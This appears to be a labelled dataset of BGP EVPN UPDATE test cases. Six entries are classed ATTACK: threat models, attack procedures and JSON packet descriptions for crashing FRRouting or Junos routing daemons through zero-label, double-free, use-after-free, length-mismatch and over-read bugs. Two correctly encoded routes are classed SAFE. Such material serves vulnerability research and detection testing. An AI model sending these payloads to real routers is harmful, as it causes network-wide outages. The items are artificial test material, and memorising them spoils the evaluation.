## 1) EVPN-UPDATE - evpn-type2-zero-labels-abort
**Message:** EVPN-UPDATE
**Target Attribute's path:** evpn-type2-zero-labels-abort
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting 10.0.1 with BGP EVPN enabled (AFI 25, SAFI 70). RFC 7432 Section 9.2 specifies that an EVPN Route Type 2 (MAC/IP Advertisement Route) MUST carry at least one MPLS label (the VNI in VXLAN deployments). FRR's bgpd processes EVPN Type 2 routes through the function bgp_evpn_mpath_has_dvni(), which accesses the label array via label2vni(). However, when a Type 2 route arrives with num_labels=0 (no MPLS label encoded in the NLRI), the code does not check for this condition before calling label2vni(), which triggers an assertion failure (abort()) because it attempts to read from an empty label array.
We assume: (i) the attacker has established a BGP session (iBGP via route reflector, or eBGP) with the target FRR router; (ii) EVPN address family is activated; and (iii) the target runs FRR 10.0.x (affected by issue #18678).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message containing an MP_REACH_NLRI attribute with AFI=25, SAFI=70 (L2VPN EVPN). The NLRI encodes an EVPN Route Type 2 (MAC/IP Advertisement) with a valid Route Distinguisher, Ethernet Tag, MAC address, and IP address, but the MPLS Label field is omitted -- the NLRI length is set to exclude the 3-byte MPLS label that RFC 7432 requires. When FRR parses this Type 2 route, it successfully decodes the RD, MAC, and IP fields, and sets num_labels=0 because no label bytes remain. Later, when bgp_evpn_mpath_has_dvni() is called during best-path selection, it invokes label2vni(&path->extra->label[0]) on the empty label array, triggering abort(). The bgpd process terminates, dropping all BGP sessions and withdrawing all routes. The PoC is successful if the target FRR bgpd process aborts upon receiving this UPDATE.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 95
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [65001]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 25,
        "safi": 70,
        "next_hop": "10.0.0.1",
        "nlri": [
          {
            "route_type": 2,
            "route_type_name": "MAC/IP Advertisement Route",
            "rd": "10.0.0.1:100",
            "ethernet_segment_id": "00:00:00:00:00:00:00:00:00:00",
            "ethernet_tag_id": 0,
            "mac_address_length": 48,
            "mac_address": "aa:bb:cc:dd:ee:01",
            "ip_address_length": 32,
            "ip_address": "192.168.1.100",
            "mpls_label": "OMITTED",
            "mpls_label_note": "RFC 7432 requires at least one MPLS label; omitting it causes num_labels=0 and abort() in FRR label2vni()"
          }
        ]
      }
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 16,
      "attr_name": "EXTENDED_COMMUNITIES",
      "attr_value": [
        {
          "type": "0x0002",
          "name": "route-target",
          "value": "65001:10100"
        }
      ]
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 2) EVPN-UPDATE - evpn-rt-both-double-free
**Message:** EVPN-UPDATE
**Target Attribute's path:** evpn-rt-both-double-free
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting with BGP EVPN enabled. When an EVPN instance is configured with "route-target both X:Y", FRR internally creates route-target entries for both import and export. However, in affected versions (before PR #12761), the code creates only a single route-target node and adds it to both the import and export lists. When the EVPN instance is reconfigured or deleted, the cleanup code iterates both lists and frees each node, resulting in a double-free of the shared node. This can be triggered remotely if the attacker can cause the target router to process an EVPN route that triggers a VRF import/export recalculation.
We assume: (i) the attacker has established a BGP session with the target FRR router; (ii) the target has EVPN configured with "route-target both"; and (iii) the target runs a vulnerable FRR version.
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a sequence of BGP UPDATE messages that advertise and then withdraw EVPN Type 2 routes with Route Target extended communities that match the target's "route-target both" configuration. The advertisement causes FRR to import the route into the local VRF, creating internal route-target state. The subsequent withdrawal triggers cleanup of the imported route. If the withdrawal processing races with or triggers a reconfiguration of the route-target lists (e.g., through auto-derived RT recalculation when the last route for an EVI is withdrawn), the shared route-target node is freed twice. The double-free corrupts the heap allocator metadata, which can cause an immediate crash (segfault in the next malloc/free call) or, in worst case, allow heap exploitation. The PoC is successful if the target FRR bgpd process crashes due to heap corruption after processing the advertise-then-withdraw sequence.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 95
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [65001]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 15,
      "attr_name": "MP_UNREACH_NLRI",
      "attr_value": {
        "afi": 25,
        "safi": 70,
        "withdrawn_routes": [
          {
            "route_type": 2,
            "route_type_name": "MAC/IP Advertisement Route",
            "rd": "10.0.0.1:100",
            "ethernet_segment_id": "00:00:00:00:00:00:00:00:00:00",
            "ethernet_tag_id": 0,
            "mac_address_length": 48,
            "mac_address": "aa:bb:cc:dd:ee:01",
            "ip_address_length": 32,
            "ip_address": "192.168.1.100",
            "mpls_label": 10100,
            "note": "withdrawal of previously advertised Type 2 route triggers double-free of shared route-target node when 'route-target both' is configured"
          }
        ]
      }
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 3) EVPN-UPDATE - evpn-overlay-use-after-free
**Message:** EVPN-UPDATE
**Target Attribute's path:** evpn-overlay-use-after-free
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting with BGP EVPN enabled and debug logging active (debug bgp updates). FRR's EVPN route processing interns the bgp_route_evpn overlay structure via evpn_overlay_intern() to save memory when multiple paths share the same overlay data. When a new UPDATE replaces an existing EVPN route, the old path's overlay structure is freed (unintern), and a new interned structure is assigned to attr_new. However, the debug logging function bgp_debug_rdpfxpath2str() is called after the old overlay is freed but still holds a reference to the old attr's evpn_overlay pointer, resulting in a use-after-free.
We assume: (i) the attacker has established a BGP session with the target FRR router; (ii) EVPN is activated with debug logging enabled; and (iii) the target runs a vulnerable FRR version (before PR #18664).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker first sends a BGP UPDATE advertising an EVPN Type 2 route for MAC aa:bb:cc:dd:ee:01 with IP 192.168.1.100 and MPLS label 10100. FRR installs this route and interns the overlay structure. The attacker then sends a second UPDATE for the same MAC/IP but with a different MPLS label (10200), causing FRR to replace the existing path. During replacement, the old overlay is unintered (freed), and attr_new gets a new interned overlay. The debug logging code then attempts to format the old path's RD and prefix information using the already-freed overlay pointer. The use-after-free reads from deallocated heap memory, which may contain arbitrary data from subsequent allocations. This causes either a crash (if the freed memory has been unmapped or reallocated with incompatible data) or information disclosure (if the freed memory contains sensitive data from other BGP routes). The PoC is successful if the target FRR bgpd process crashes or exhibits anomalous debug output after processing the route replacement.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 110
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [65001]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 25,
        "safi": 70,
        "next_hop": "10.0.0.1",
        "nlri": [
          {
            "route_type": 2,
            "route_type_name": "MAC/IP Advertisement Route",
            "rd": "10.0.0.1:100",
            "ethernet_segment_id": "00:00:00:00:00:00:00:00:00:00",
            "ethernet_tag_id": 0,
            "mac_address_length": 48,
            "mac_address": "aa:bb:cc:dd:ee:01",
            "ip_address_length": 32,
            "ip_address": "192.168.1.100",
            "mpls_label": 10200,
            "mpls_label_note": "second UPDATE for same MAC/IP with different label; replaces existing path and triggers use-after-free in debug logging of old overlay"
          }
        ]
      }
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 16,
      "attr_name": "EXTENDED_COMMUNITIES",
      "attr_value": [
        {
          "type": "0x0002",
          "name": "route-target",
          "value": "65001:10100"
        },
        {
          "type": "0x030c",
          "name": "tunnel-encapsulation",
          "value": "VXLAN"
        }
      ]
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 4) EVPN-UPDATE - evpn-malformed-update-length-inconsistency
**Message:** EVPN-UPDATE
**Target Attribute's path:** evpn-malformed-update-length-inconsistency
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs Juniper Junos OS with EVPN configured (both iBGP and eBGP). RFC 7432 defines the NLRI format for each EVPN route type with specific length requirements -- for example, a Type 2 MAC/IP route with an IPv4 address has a fixed NLRI length of 33 bytes (excluding RD) when no IP is present, or 37 bytes with IPv4, or 49 bytes with IPv6. Junos OS's routing protocol daemon (rpd) parses EVPN NLRI by first reading the route type and length, then dispatching to a type-specific parser. However, rpd does not properly validate that the declared NLRI length is consistent with the route type's expected length before accessing the NLRI fields. When the declared length is shorter than expected, the parser reads beyond the NLRI boundary.
We assume: (i) the attacker has established a BGP session with the target Junos router; (ii) EVPN is configured; and (iii) the target runs an affected Junos version (before the fix for CVE-2025-52949).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE with an MP_REACH_NLRI containing an EVPN Type 2 route where the NLRI length field is set to 20 bytes, but the route type requires at least 33 bytes (RD 8 bytes + ESI 10 bytes + Ethernet Tag 4 bytes + MAC length 1 byte + MAC 6 bytes + IP length 1 byte + label 3 bytes = 33 bytes minimum for MAC-only). The rpd parser reads the RD (8 bytes) and ESI (10 bytes) successfully, consuming 18 of the 20 declared bytes. When it attempts to read the Ethernet Tag (4 bytes), only 2 bytes remain in the declared NLRI, but the parser does not check this boundary and reads 4 bytes, consuming 2 bytes from the next NLRI or from adjacent attribute data. This length parameter inconsistency (CWE-130) causes rpd to crash. The crash is persistent -- if the attacker's BGP session re-establishes and resends the malformed UPDATE, rpd crashes again, creating a denial-of-service loop. The PoC is successful if the target Junos rpd process crashes upon receiving this UPDATE. This vulnerability is tracked as CVE-2025-52949 (CVSS 7.1 HIGH).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 85
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [65001]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 25,
        "safi": 70,
        "next_hop": "10.0.0.1",
        "nlri": [
          {
            "route_type": 2,
            "route_type_name": "MAC/IP Advertisement Route",
            "nlri_length_declared": 20,
            "nlri_length_expected": 33,
            "nlri_length_note": "declares 20 bytes but Type 2 MAC-only requires minimum 33 bytes; parser reads beyond declared boundary causing rpd crash",
            "rd": "10.0.0.1:100",
            "ethernet_segment_id": "00:00:00:00:00:00:00:00:00:00",
            "ethernet_tag_id": "TRUNCATED",
            "mac_address_length": "TRUNCATED",
            "mac_address": "TRUNCATED"
          }
        ]
      }
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 16,
      "attr_name": "EXTENDED_COMMUNITIES",
      "attr_value": [
        {
          "type": "0x0002",
          "name": "route-target",
          "value": "65001:10100"
        }
      ]
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 5) EVPN-UPDATE - evpn-overlay-unintern-dangling-hash
**Message:** EVPN-UPDATE
**Target Attribute's path:** evpn-overlay-unintern-dangling-hash
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting with BGP EVPN enabled. FRR uses an interning mechanism for EVPN overlay structures (bgp_attr_evpn_overlay) to deduplicate identical overlay data across multiple paths. The intern hash table maps overlay content to a reference-counted structure. When a path is removed, evpn_overlay_unintern() decrements the reference count and, if it reaches zero, frees the structure. However, in affected versions (before PR #19549), the hash table entry is not removed before the structure is freed, leaving a dangling pointer in the hash table. If a subsequent EVPN route arrives with overlay data that hashes to the same bucket, the hash lookup may follow the dangling pointer to freed memory.
We assume: (i) the attacker has established a BGP session with the target FRR router; (ii) EVPN is activated; and (iii) the target runs a vulnerable FRR version.
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends three BGP UPDATE messages in sequence: (1) Advertise an EVPN Type 2 route for MAC aa:bb:cc:dd:ee:01 with label 10100 -- this creates an interned overlay structure with refcount=1. (2) Withdraw the same route -- evpn_overlay_unintern() decrements refcount to 0 and frees the structure, but the hash entry remains pointing to the freed memory. (3) Advertise a new EVPN Type 2 route for a different MAC aa:bb:cc:dd:ee:02 but with overlay data that hashes to the same bucket. The hash lookup traverses the bucket chain and dereferences the dangling pointer from step 2. If the freed memory has been reallocated for a different purpose, the hash comparison reads arbitrary data, causing either a crash (segfault on unmapped memory) or a false hash match that corrupts the intern table. The PoC is successful if the target FRR bgpd process crashes or exhibits memory corruption after processing this three-message sequence.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 110
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [65001]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 25,
        "safi": 70,
        "next_hop": "10.0.0.1",
        "nlri": [
          {
            "route_type": 2,
            "route_type_name": "MAC/IP Advertisement Route",
            "rd": "10.0.0.1:100",
            "ethernet_segment_id": "00:00:00:00:00:00:00:00:00:00",
            "ethernet_tag_id": 0,
            "mac_address_length": 48,
            "mac_address": "aa:bb:cc:dd:ee:02",
            "ip_address_length": 32,
            "ip_address": "192.168.1.200",
            "mpls_label": 10100,
            "note": "third message in sequence: new MAC with same-bucket hash as previously freed overlay; triggers dangling pointer dereference in intern hash table"
          }
        ]
      }
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 16,
      "attr_name": "EXTENDED_COMMUNITIES",
      "attr_value": [
        {
          "type": "0x0002",
          "name": "route-target",
          "value": "65001:10100"
        },
        {
          "type": "0x030c",
          "name": "tunnel-encapsulation",
          "value": "VXLAN"
        }
      ]
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 6) EVPN-UPDATE - labeled-unicast-stream-overread
**Message:** EVPN-UPDATE
**Target Attribute's path:** labeled-unicast-stream-overread
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting before version 8.5 with labeled unicast or EVPN enabled. FRR's bgpd/bgp_label.c parses labeled unicast NLRI by reading a 3-byte MPLS label followed by the prefix. RFC 8277 Section 2 specifies the encoding of labeled NLRI: the label stack is encoded before the prefix, and the total NLRI length includes both the label(s) and the prefix. However, FRR's parser reads the label bytes from the input stream without first verifying that the stream contains enough remaining bytes. When the NLRI length declares a value that is less than 3 (the minimum for one label), the parser attempts to read beyond the end of the stream buffer.
We assume: (i) the attacker has established a BGP session with the target FRR router; (ii) labeled unicast or EVPN with labels is activated; and (iii) the target runs FRR < 8.5 (before the fix for CVE-2023-38407).
- **Attacker Capability:**
The attacker can send arbitrary BGP UPDATE messages on an established BGP session.

**Attack Procedure:**
The attacker sends a BGP UPDATE message containing an MP_REACH_NLRI attribute with AFI=25, SAFI=70 (or AFI=1, SAFI=4 for labeled unicast). The NLRI encodes a labeled route where the total NLRI length is set to 2 bytes -- less than the 3 bytes required for a single MPLS label. FRR's label parser in bgp_label.c calls stream_getc() or stream_get() three times to read the 3-byte label, but only 2 bytes remain in the stream. The third read exceeds the stream's end pointer, causing an out-of-bounds read. Depending on the stream implementation, this either returns garbage data (causing incorrect label parsing and potential route corruption) or triggers an assertion failure that crashes bgpd. The PoC is successful if the target FRR bgpd process crashes or installs a route with a corrupted label upon receiving this UPDATE. This vulnerability is tracked as CVE-2023-38407 (CVSS 7.5 HIGH).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "bgp_header": {
    "marker": "ffffffffffffffffffffffffffffffff",
    "type": 2,
    "length": 80
  },
  "withdrawn_routes_length": 0,
  "withdrawn_routes": [],
  "path_attributes": [
    {
      "attr_flags": "0x40",
      "attr_type": 1,
      "attr_name": "ORIGIN",
      "attr_value": 0
    },
    {
      "attr_flags": "0x40",
      "attr_type": 2,
      "attr_name": "AS_PATH",
      "attr_value": [
        {
          "segment_type": "AS_SEQUENCE",
          "segment_value": [65001]
        }
      ]
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 14,
      "attr_name": "MP_REACH_NLRI",
      "attr_value": {
        "afi": 25,
        "safi": 70,
        "next_hop": "10.0.0.1",
        "nlri": [
          {
            "route_type": 2,
            "route_type_name": "MAC/IP Advertisement Route",
            "rd": "10.0.0.1:100",
            "ethernet_segment_id": "00:00:00:00:00:00:00:00:00:00",
            "ethernet_tag_id": 0,
            "mac_address_length": 48,
            "mac_address": "aa:bb:cc:dd:ee:01",
            "ip_address_length": 0,
            "mpls_label_raw_length": 2,
            "mpls_label_raw_length_note": "MPLS label requires 3 bytes minimum; only 2 bytes provided, causing stream over-read in bgp_label.c",
            "mpls_label": "TRUNCATED"
          }
        ]
      }
    },
    {
      "attr_flags": "0xc0",
      "attr_type": 16,
      "attr_name": "EXTENDED_COMMUNITIES",
      "attr_value": [
        {
          "type": "0x0002",
          "name": "route-target",
          "value": "65001:10100"
        }
      ]
    }
  ],
  "nlri": []
}

**Classification:**
ATTACK


## 7) EVPN-UPDATE - valid-type2-correct-encoding
**Message:** EVPN-UPDATE
**Target Attribute's path:** valid-type2-correct-encoding
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs FRRouting 10.2 with BGP EVPN enabled. A legitimate VTEP sends a standard EVPN Type 2 (MAC/IP Advertisement) route with all fields correctly encoded per RFC 7432 Section 9.2.
We assume: (i) the VTEP has an established iBGP session via route reflector; (ii) all NLRI fields have correct lengths -- RD is 8 bytes, ESI is 10 bytes, Ethernet Tag is 4 bytes, MAC length is 48 (6 bytes), IP length is 32 (4 bytes), and MPLS label is 3 bytes; and (iii) the total NLRI length field correctly reflects the sum of all encoded fields.
- **Attacker Capability:**
The VTEP sends BGP EVPN UPDATE messages on an established iBGP session.
**Security Analysis:**
This EVPN Type 2 route is fully compliant with RFC 7432. The NLRI length field exactly matches the encoded content (8+10+4+1+6+1+4+3 = 37 bytes for MAC+IPv4+label). The MPLS label is present and correctly encoded as 3 bytes. The Route Target extended community matches the configured EVI. No parser in any compliant implementation will encounter a length mismatch, buffer over-read, assertion failure, or use-after-free when processing this UPDATE. The route will be correctly installed in the EVPN RIB, the MAC/IP binding will be populated in the forwarding table, and VXLAN encapsulation will function normally. The num_labels field will be correctly set to 1, and label2vni() will successfully extract the VNI. This represents correct EVPN operation.

**Classification:**
SAFE


## 8) EVPN-UPDATE - valid-type5-correct-encoding
**Message:** EVPN-UPDATE
**Target Attribute's path:** valid-type5-correct-encoding
**Threat Model:**
- **Attack Assumption:**
In the target network, a BGP speaker runs GoBGP 3.35.0 with BGP EVPN enabled. A legitimate VTEP sends a standard EVPN Type 5 (IP Prefix Route) with all fields correctly encoded per RFC 9136.
We assume: (i) the VTEP has an established BGP session; (ii) the Type 5 NLRI has correct lengths -- RD 8 bytes, ESI 10 bytes, Ethernet Tag 4 bytes, IP prefix length 1 byte, IP prefix 4 bytes (for /24), Gateway IP 4 bytes, MPLS label 3 bytes; (iii) the total NLRI length correctly reflects the sum; and (iv) all path attributes have consistent length fields.
- **Attacker Capability:**
The VTEP sends BGP EVPN UPDATE messages on an established BGP session.
**Security Analysis:**
This EVPN Type 5 route is fully compliant with RFC 9136 and RFC 7432. Every length field in the NLRI and path attributes is consistent with the actual encoded data. The NEXT_HOP attribute is exactly 4 bytes for IPv4. The MP_REACH_NLRI attribute length correctly accounts for the AFI/SAFI, next-hop length, next-hop value, and NLRI. The FlowSpec parser is not invoked (this is SAFI 70, not SAFI 133). No implementation will crash, panic, or exhibit anomalous behavior. The route will be correctly installed for inter-subnet routing in the EVPN-IRB fabric. This represents correct protocol operation.

**Classification:**
SAFE
